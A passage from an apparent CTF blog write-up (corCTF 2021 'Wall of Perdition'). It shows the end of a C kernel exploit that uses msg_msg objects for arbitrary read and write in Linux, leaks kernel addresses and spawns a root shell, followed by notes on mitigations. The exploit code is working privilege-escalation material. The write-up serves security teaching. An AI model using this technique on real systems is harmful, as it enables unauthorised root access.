          <td id="file-wall_exploit-c-LC695" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">edit</span>(fd, <span class="pl-c1">0</span>, buffer, OUTBOUND, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L696" class="blob-num js-line-number js-code-nav-line-number" data-line-number="696"></td>
          <td id="file-wall_exploit-c-LC696" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">get_msg</span>(front_qid, recieved, <span class="pl-c1">0xfd0</span>, <span class="pl-c1">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L697" class="blob-num js-line-number js-code-nav-line-number" data-line-number="697"></td>
          <td id="file-wall_exploit-c-LC697" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)&amp;big_msg, (<span class="pl-k">void</span> *)recieved + msg_offset, <span class="pl-c1">8</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L698" class="blob-num js-line-number js-code-nav-line-number" data-line-number="698"></td>
          <td id="file-wall_exploit-c-LC698" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>leaked 4k msg_msg address of 8k msg: 0x<span class="pl-c1">%llx</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, big_msg);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L699" class="blob-num js-line-number js-code-nav-line-number" data-line-number="699"></td>
          <td id="file-wall_exploit-c-LC699" class="blob-code blob-code-inner js-file-line">    evil.<span class="pl-smi">m_ts</span> = <span class="pl-c1">0x10f0</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L700" class="blob-num js-line-number js-code-nav-line-number" data-line-number="700"></td>
          <td id="file-wall_exploit-c-LC700" class="blob-code blob-code-inner js-file-line">    evil.<span class="pl-smi">next</span> = (<span class="pl-k">void</span> *)big_msg - <span class="pl-c1">0x10</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L701" class="blob-num js-line-number js-code-nav-line-number" data-line-number="701"></td>
          <td id="file-wall_exploit-c-LC701" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>(buffer, (<span class="pl-k">void</span> *)&amp;evil, <span class="pl-k">sizeof</span>(msg_header));</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L702" class="blob-num js-line-number js-code-nav-line-number" data-line-number="702"></td>
          <td id="file-wall_exploit-c-LC702" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">edit</span>(fd, <span class="pl-c1">0</span>, buffer, OUTBOUND, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L703" class="blob-num js-line-number js-code-nav-line-number" data-line-number="703"></td>
          <td id="file-wall_exploit-c-LC703" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">get_msg</span>(front_qid, recieved, <span class="pl-c1">0x10f0</span>, <span class="pl-c1">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L704" class="blob-num js-line-number js-code-nav-line-number" data-line-number="704"></td>
          <td id="file-wall_exploit-c-LC704" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)&amp;big_segment, (<span class="pl-k">void</span> *)recieved + <span class="pl-c1">0x1000</span>, <span class="pl-c1">8</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L705" class="blob-num js-line-number js-code-nav-line-number" data-line-number="705"></td>
          <td id="file-wall_exploit-c-LC705" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>leaked 4k msg_msg segment: 0x<span class="pl-c1">%llx</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, big_segment);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L706" class="blob-num js-line-number js-code-nav-line-number" data-line-number="706"></td>
          <td id="file-wall_exploit-c-LC706" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L707" class="blob-num js-line-number js-code-nav-line-number" data-line-number="707"></td>
          <td id="file-wall_exploit-c-LC707" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> now officially time to hang and arb write</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L708" class="blob-num js-line-number js-code-nav-line-number" data-line-number="708"></td>
          <td id="file-wall_exploit-c-LC708" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> because of LIFO, segment is now first, and original msg is now segment</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L709" class="blob-num js-line-number js-code-nav-line-number" data-line-number="709"></td>
          <td id="file-wall_exploit-c-LC709" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint64_t</span> new_big_msg = big_segment;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L710" class="blob-num js-line-number js-code-nav-line-number" data-line-number="710"></td>
          <td id="file-wall_exploit-c-LC710" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint64_t</span> new_big_segment = big_msg;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L711" class="blob-num js-line-number js-code-nav-line-number" data-line-number="711"></td>
          <td id="file-wall_exploit-c-LC711" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>new big message address: 0x<span class="pl-c1">%llx</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, new_big_msg);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L712" class="blob-num js-line-number js-code-nav-line-number" data-line-number="712"></td>
          <td id="file-wall_exploit-c-LC712" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>new segment address: 0x<span class="pl-c1">%llx</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, new_big_segment);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L713" class="blob-num js-line-number js-code-nav-line-number" data-line-number="713"></td>
          <td id="file-wall_exploit-c-LC713" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L714" class="blob-num js-line-number js-code-nav-line-number" data-line-number="714"></td>
          <td id="file-wall_exploit-c-LC714" class="blob-code blob-code-inner js-file-line">    evil.<span class="pl-smi">m_ts</span> = <span class="pl-c1">0x10</span>; <span class="pl-c"><span class="pl-c">//</span> should still free the next pointer</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L715" class="blob-num js-line-number js-code-nav-line-number" data-line-number="715"></td>
          <td id="file-wall_exploit-c-LC715" class="blob-code blob-code-inner js-file-line">    evil.<span class="pl-smi">next</span> = (<span class="pl-k">void</span> *)new_big_segment;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L716" class="blob-num js-line-number js-code-nav-line-number" data-line-number="716"></td>
          <td id="file-wall_exploit-c-LC716" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>(buffer, (<span class="pl-k">void</span> *)&amp;evil, <span class="pl-k">sizeof</span>(msg_header));</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L717" class="blob-num js-line-number js-code-nav-line-number" data-line-number="717"></td>
          <td id="file-wall_exploit-c-LC717" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">edit</span>(fd, <span class="pl-c1">0</span>, buffer, OUTBOUND, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L718" class="blob-num js-line-number js-code-nav-line-number" data-line-number="718"></td>
          <td id="file-wall_exploit-c-LC718" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L719" class="blob-num js-line-number js-code-nav-line-number" data-line-number="719"></td>
          <td id="file-wall_exploit-c-LC719" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">get_msg</span>(target_qid, recieved, <span class="pl-c1">0x1f00</span>, <span class="pl-c1">2</span>, IPC_NOWAIT | MSG_NOERROR); <span class="pl-c"><span class="pl-c">//</span>basic cleanup before finale</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L720" class="blob-num js-line-number js-code-nav-line-number" data-line-number="720"></td>
          <td id="file-wall_exploit-c-LC720" class="blob-code blob-code-inner js-file-line">    finale = (<span class="pl-k">void</span> *)<span class="pl-c1">0x1338000</span> - <span class="pl-c1">0xfd0</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L721" class="blob-num js-line-number js-code-nav-line-number" data-line-number="721"></td>
          <td id="file-wall_exploit-c-LC721" class="blob-code blob-code-inner js-file-line">    size = <span class="pl-c1">0x1e00</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L722" class="blob-num js-line-number js-code-nav-line-number" data-line-number="722"></td>
          <td id="file-wall_exploit-c-LC722" class="blob-code blob-code-inner js-file-line">    target_msg_idx = <span class="pl-c1">5</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L723" class="blob-num js-line-number js-code-nav-line-number" data-line-number="723"></td>
          <td id="file-wall_exploit-c-LC723" class="blob-code blob-code-inner js-file-line">    finale-&gt;<span class="pl-smi">mtype</span> = target_msg_idx;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L724" class="blob-num js-line-number js-code-nav-line-number" data-line-number="724"></td>
          <td id="file-wall_exploit-c-LC724" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">send_msg</span>(target_qid, finale, size - <span class="pl-c1">0x30</span>, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L725" class="blob-num js-line-number js-code-nav-line-number" data-line-number="725"></td>
          <td id="file-wall_exploit-c-LC725" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L726" class="blob-num js-line-number js-code-nav-line-number" data-line-number="726"></td>
          <td id="file-wall_exploit-c-LC726" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">pthread_join</span>(thread1, <span class="pl-c1">NULL</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L727" class="blob-num js-line-number js-code-nav-line-number" data-line-number="727"></td>
          <td id="file-wall_exploit-c-LC727" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">pthread_join</span>(thread2, <span class="pl-c1">NULL</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L728" class="blob-num js-line-number js-code-nav-line-number" data-line-number="728"></td>
          <td id="file-wall_exploit-c-LC728" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L729" class="blob-num js-line-number js-code-nav-line-number" data-line-number="729"></td>
          <td id="file-wall_exploit-c-LC729" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">while</span> (marker != <span class="pl-c1">3</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L730" class="blob-num js-line-number js-code-nav-line-number" data-line-number="730"></td>
          <td id="file-wall_exploit-c-LC730" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L731" class="blob-num js-line-number js-code-nav-line-number" data-line-number="731"></td>
          <td id="file-wall_exploit-c-LC731" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>current uid: <span class="pl-c1">%d</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, <span class="pl-c1">getuid</span>());</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L732" class="blob-num js-line-number js-code-nav-line-number" data-line-number="732"></td>
          <td id="file-wall_exploit-c-LC732" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L733" class="blob-num js-line-number js-code-nav-line-number" data-line-number="733"></td>
          <td id="file-wall_exploit-c-LC733" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">system</span>(<span class="pl-s"><span class="pl-pds">"</span>/bin/sh<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L734" class="blob-num js-line-number js-code-nav-line-number" data-line-number="734"></td>
          <td id="file-wall_exploit-c-LC734" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


  </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/BitsByWill/cf23c13d4a1d345b557a157740e191fe/raw/22c9c8f0ec44a889d72d7a62674449085cfacdf6/wall_exploit.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/BitsByWill/cf23c13d4a1d345b557a157740e191fe#file-wall_exploit-c">
          wall_exploit.c
        </a>
        hosted with ❤ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
</div><div>Running this remotely should eventually give us root privs and the flag:</div><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-5Pr_U6KILvM/YSh6-vJT03I/AAAAAAAACIo/zgLEfxCmsJk9rKcA3-JayA8PXpZzNxyQgCLcBGAsYHQ/s764/hard_mode.gif" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="588" data-original-width="764" height="492" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/hard_mode.gif" width="640"></a></div><div><br></div><div>Congratulations to <a href="https://github.com/jifill" target="_blank">jass93 of RPISEC</a> for taking the unofficial post-CTF first blood on this challenge. The player didn't exactly go down the intended route of abusing an arb free primitive, but rather went on to abuse the unlinking mechanism in msgrcv, which seems quite powerful too. Overall, D3v17 and I learned a lot from developing these challenges, and believe that these primitives will be quite applicable on most kernel versions given a somewhat sizeable UAF. The changing in default unpriviledged userfaultfd permissions definitely deprecate these primitives, and the potential idea of a <a href="https://a13xp0p0v.github.io/2020/11/30/slab-quarantine.html">SLAB quarantine</a> mechanism would render this technique pretty much useless for non 4k slab sizes due to its reliance on LIFO behavior. Another really interesting kernel hardening measure we accidentally stumbled upon was <a href="https://lwn.net/Articles/743749/">usercopy whitelisting</a>, in which slab regions have whitelists on what usercopy can interact with. Luckily, fallback is enabled by default and on most Linux distros, but if it was enabled, our SMAP bypass methodology would have failed. Thankfully modprobe_path and core_pattern still exists, but we wonder what other SMAP bypass techniques would be just as simple and elegant. Hopefully, you would have learned a lot from this writeup, and make sure to read D3v17's in depth and amazing <a href="https://syst3mfailure.io/wall-of-perdition" target="_blank">writeup for Wall of Perdition</a>!</div>
<div style="clear: both;"></div>
</div>
<div class="post-footer">
<div class="post-footer-line post-footer-line-1">
<span class="post-author vcard">
Posted by
<span class="fn" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person">
<span itemprop="name">willsroot</span>
</span>
</span>
<span class="post-timestamp">
at
<meta content="https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html" itemprop="url">
<a class="timestamp-link" href="https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html" rel="bookmark" title="permanent link"><abbr class="published" itemprop="datePublished" title="2021-08-26T15:56:00-07:00">3:56 PM</abbr></a>
</span>
<span class="post-comment-link">
</span>
<span class="post-icons">
<span class="item-control blog-admin pid-1768080780">
<a href="https://www.blogger.com/post-edit.g?blogID=8814147965526194982&amp;postID=5446202128615786254&amp;from=pencil" title="Edit Post">
<img alt="" class="icon-action" height="18" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/icon18_edit_allbkg.gif" width="18">
</a>
</span>
</span>
<div class="post-share-buttons goog-inline-block">
<a class="goog-inline-block share-button sb-email" href="https://www.blogger.com/share-post.g?blogID=8814147965526194982&amp;postID=5446202128615786254&amp;target=email" target="_blank" title="Email This"><span class="share-button-link-text">Email This</span></a><a class="goog-inline-block share-button sb-blog" href="https://www.blogger.com/share-post.g?blogID=8814147965526194982&amp;postID=5446202128615786254&amp;target=blog" onclick="window.open(this.href, &quot;_blank&quot;, &quot;height=270,width=475&quot;); return false;" target="_blank" title="BlogThis!"><span class="share-button-link-text">BlogThis!</span></a><a class="goog-inline-block share-button sb-twitter" href="https://www.blogger.com/share-post.g?blogID=8814147965526194982&amp;postID=5446202128615786254&amp;target=twitter" target="_blank" title="Share to Twitter"><span class="share-button-link-text">Share to Twitter</span></a><a class="goog-inline-block share-button sb-facebook" href="https://www.blogger.com/share-post.g?blogID=8814147965526194982&amp;postID=5446202128615786254&amp;target=facebook" onclick="window.open(this.href, &quot;_blank&quot;, &quot;height=430,width=640&quot;); return false;" target="_blank" title="Share to Facebook"><span class="share-button-link-text">Share to Facebook</span></a><a class="goog-inline-block share-button sb-pinterest" href="https://www.blogger.com/share-post.g?blogID=8814147965526194982&amp;postID=5446202128615786254&amp;target=pinterest" target="_blank" title="Share to Pinterest"><span class="share-button-link-text">Share to Pinterest</span></a>
</div>
</div>
<div class="post-footer-line post-footer-line-2">
<span class="post-labels">
</span>
</div>
<div class="post-footer-line post-footer-line-3">
<span class="post-location">
</span>
</div>
</div>
</div>
<div class="comments" id="comments">
<a name="comments"></a>
<h4>No comments:</h4>
<div id="Blog1_comments-block-wrapper">
<dl class="avatar-comment-indent" id="comments-block">
</dl>
</div>
<p class="comment-footer">
</p><div class="comment-form">
<a name="comment-form"></a>
<h4 id="comment-post-message">Post a Comment</h4>
<p>
</p>
<a href="https://www.blogger.com/comment-iframe.g?blogID=8814147965526194982&amp;postID=5446202128615786254&amp;blogspotRpcToken=5776452" id="comment-editor-src"></a>
<iframe allowtransparency="true" class="blogger-iframe-colorize blogger-comment-from-post" frameborder="0" height="195px" id="comment-editor" name="comment-editor" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/comment-iframe.html" width="100%" data-resized="true"></iframe>
<script src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/3261120736-comment_from_post_iframe.js.下載" type="text/javascript"></script>
<script type="text/javascript">
      BLOG_CMT_createIframe('https://www.blogger.com/rpc_relay.html');
    </script>
</div>
<p></p>
</div>
</div>

        </div></div>
      
</div>
<div class="blog-pager" id="blog-pager">
<span id="blog-pager-newer-link">
<a class="blog-pager-newer-link" href="https://www.willsroot.io/2021/10/pbctf-2021-nightclub-writeup-more-fun.html" id="Blog1_blog-pager-newer-link" title="Newer Post">Newer Post</a>
</span>
<span id="blog-pager-older-link">
<a class="blog-pager-older-link" href="https://www.willsroot.io/2021/08/corctf-2021-vmquack-writeup-writing.html" id="Blog1_blog-pager-older-link" title="Older Post">Older Post</a>
</span>
<a class="home-link" href="https://www.willsroot.io/">Home</a>
</div>
<div class="clear"></div>
<div class="post-feeds">
<div class="feed-links">
Subscribe to:
<a class="feed-link" href="https://www.willsroot.io/feeds/5446202128615786254/comments/default" target="_blank" type="application/atom+xml">Post Comments (Atom)</a>
</div>
</div>
</div></div>
</div>
</div>
<div class="column-left-outer">
<div class="column-left-inner">
<aside>
</aside>
</div>
</div>
<div class="column-right-outer">
<div class="column-right-inner">
<aside>
<div class="sidebar section" id="sidebar-right-1"><div class="widget HTML" data-version="1" id="HTML2">
<h2 class="title">My Github Page</h2>
<div class="widget-content">
Click <a href="https://github.com/BitsByWill">here</a> to access my Github page.
</div>
<div class="clear"></div>
</div><div class="widget BlogArchive" data-version="1" id="BlogArchive1">
<h2>Blog Archive</h2>
<div class="widget-content">
<div id="ArchiveList">
<div id="BlogArchive1_ArchiveList">
<ul class="hierarchy">
<li class="archivedate expanded">
<a class="toggle" href="javascript:void(0)">
<span class="zippy toggle-open">

        ▼&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2021/">
2021
</a>
<span class="post-count" dir="ltr">(10)</span>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2021/10/">
October
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate expanded">
<a class="toggle" href="javascript:void(0)">
<span class="zippy toggle-open">

        ▼&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2021/08/">
August
</a>
<span class="post-count" dir="ltr">(3)</span>
<ul class="posts">
<li><a href="https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html">corCTF 2021 Fire of Salvation Writeup: Utilizing m...</a></li>
<li><a href="https://www.willsroot.io/2021/08/corctf-2021-vmquack-writeup-writing.html">corCTF 2021 vmquack writeup: Writing a Custom Bina...</a></li>
<li><a href="https://www.willsroot.io/2021/08/ret2cds-writeup-escaping-seccomp.html">corCTF 2021 ret2cds writeup: Escaping a Seccomp Sa...</a></li>
</ul>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2021/07/">
July
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2021/04/">
April
</a>
<span class="post-count" dir="ltr">(2)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2021/03/">
March
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2021/02/">
February
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2021/01/">
January
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2020/">
2020
</a>
<span class="post-count" dir="ltr">(13)</span>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2020/12/">
December
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2020/11/">
November
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2020/10/">
October
</a>
<span class="post-count" dir="ltr">(2)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2020/06/">
June
</a>
<span class="post-count" dir="ltr">(3)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2020/05/">
May
</a>
<span class="post-count" dir="ltr">(2)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2020/04/">
April
</a>
<span class="post-count" dir="ltr">(2)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2020/02/">
February
</a>
<span class="post-count" dir="ltr">(2)</span>
</li>
</ul>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2019/">
2019
</a>
<span class="post-count" dir="ltr">(29)</span>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2019/12/">
December
</a>
<span class="post-count" dir="ltr">(2)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2019/11/">
November
</a>
<span class="post-count" dir="ltr">(3)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2019/10/">
October
</a>
<span class="post-count" dir="ltr">(6)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2019/09/">
September
</a>
<span class="post-count" dir="ltr">(12)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2019/08/">
August
</a>
<span class="post-count" dir="ltr">(3)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2019/06/">
June
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2019/03/">
March
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2019/02/">
February
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2017/">
2017
</a>
<span class="post-count" dir="ltr">(1)</span>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2017/07/">
July
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2016/">
2016
</a>
<span class="post-count" dir="ltr">(1)</span>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://www.willsroot.io/2016/07/">
July
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
</li>
</ul>
</div>
</div>
<div class="clear"></div>
</div>
</div><div class="widget FeaturedPost" data-version="1" id="FeaturedPost1">
<h2 class="title">Featured Post</h2>
<div class="post-summary">
<h3><a href="https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html">corCTF 2021 Fire of Salvation Writeup: Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel</a></h3>
<p>
In corCTF 2021, D3v17  and I wrote two kernel challenges utilizing a technique that is novel at least to our knowledge to gain arb read and ...
</p>
<img class="image" src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/1.png">
</div>
<style type="text/css">
    .image {
      width: 100%;
    }
  </style>
<div class="clear"></div>
</div><div class="widget PopularPosts" data-version="1" id="PopularPosts1">
<h2>Popular Posts</h2>
<div class="widget-content popular-posts">
<ul>
<li>
<div class="item-content">
<div class="item-title"><a href="https://www.willsroot.io/2019/09/bombs-landed-hackthebox-writeup.html">Bombs Landed HacktheBox Writeup (Password Protected)</a></div>
<div class="item-snippet">This challenge is still currently active.&nbsp; Please submit the challenge flag to continue.   Disclaimer:  Do not leak the writeups here withou...</div>
</div>
<div style="clear: both;"></div>
</li>
<li>
<div class="item-content">
